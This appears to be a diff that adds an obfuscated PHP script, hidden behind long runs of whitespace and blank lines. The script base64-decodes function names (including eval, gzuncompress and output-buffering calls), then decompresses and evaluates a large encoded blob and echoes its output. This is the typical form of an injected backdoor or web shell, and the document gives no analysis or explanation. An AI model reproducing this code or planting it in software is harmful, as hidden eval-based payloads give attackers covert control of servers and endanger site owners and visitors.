+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
